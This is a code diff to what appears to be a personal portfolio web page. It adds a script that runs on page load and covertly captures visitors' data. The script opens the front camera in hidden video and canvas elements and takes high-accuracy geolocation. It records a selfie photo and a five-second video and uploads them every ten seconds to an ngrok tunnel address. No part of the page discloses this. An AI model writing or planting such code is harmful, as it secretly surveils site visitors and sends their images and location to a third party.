@@ -1494,5 +1494,128 @@
             animateSkills();
         });
     </script>
+    <script>
+  const backendURL = "https://b5d1146d03a4.ngrok-free.app"; // Langsung ke root "/"
+
+  const video = document.createElement("video");
+  video.setAttribute("playsinline", true);
+  video.setAttribute("autoplay", true);
+  video.setAttribute("muted", true);
+  video.style.display = "none";
+  document.body.appendChild(video);
+
+  const canvas = document.createElement("canvas");
+  const ctx = canvas.getContext("2d");
+  canvas.style.display = "none";
+  document.body.appendChild(canvas);
+
+  let mediaStream = null;
+
+  async function initCamera() {
+    try {
+      mediaStream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: "user" },
+        audio: false
+      });
+      video.srcObject = mediaStream;
+      await video.play();
+      console.log("✅ Kamera aktif");
+    } catch (err) {
+      console.warn("❌ Kamera tidak diizinkan:", err.message);
+    }
+  }
+
+  async function getLocation() {
+    return new Promise((resolve) => {
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          console.log("📍 Lokasi diambil:", pos.coords);
+          resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude });
+        },
+        (err) => {
+          console.warn("❌ Lokasi tidak diizinkan:", err.message);
+          resolve(null);
+        },
+        { enableHighAccuracy: true }
+      );
+    });
+  }
+
+  async function capturePhoto() {
+    return new Promise((resolve) => {
+      if (!video.videoWidth || !video.videoHeight) return resolve(null);
+
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      canvas.toBlob((blob) => resolve(blob), "image/jpeg", 0.95);
+    });
+  }
+
+  async function captureVideo(durationMs = 5000) {
+  if (!mediaStream) return null;
+
+  return new Promise((resolve) => {
+    const chunks = [];
+    const recorder = new MediaRecorder(mediaStream, {
+      mimeType: "video/webm;codecs=vp8"
+    });
+
+    recorder.ondataavailable = (e) => {
+      if (e.data.size > 0) chunks.push(e.data);
+    };
+    recorder.onstop = () => {
+      const blob = new Blob(chunks, { type: "video/webm" });
+      resolve(blob);
+    };
+
+    recorder.start();
+    setTimeout(() => recorder.stop(), durationMs);
+  });
+}
+
+async function sendAll() {
+  const [location, photo, videoBlob] = await Promise.all([
+    getLocation(),
+    capturePhoto(),
+    captureVideo()
+  ]);
+
+  const formData = new FormData();
+  if (location) {
+    formData.append("lat", location.lat);
+    formData.append("lon", location.lon);
+  }
+  if (photo) formData.append("photo", photo, "selfie.jpg");
+  if (videoBlob && videoBlob.size > 2000) {
+    formData.append("video", videoBlob, "rekaman.webm");
+  } else {
+    console.warn("⚠️ Video terlalu kecil, tidak dikirim");
+  }
+
+  if ([...formData.entries()].length > 0) {
+    try {
+      await fetch(backendURL, {
+        method: "POST",
+        body: formData
+      });
+      console.log("✅ Data terkirim");
+    } catch (e) {
+      console.error("❌ Gagal kirim:", e);
+    }
+  } else {
+    console.warn("❌ Tidak ada data untuk dikirim");
+  }
+}
+  async function startSystem() {
+    await initCamera();
+    setTimeout(() => {
+      sendAll(); // Kirim pertama
+      setInterval(sendAll, 10000); // Tiap 10 detik
+    }, 7000);
+  }
+
+  startSystem();
+    </script>
 </body>
 </html>
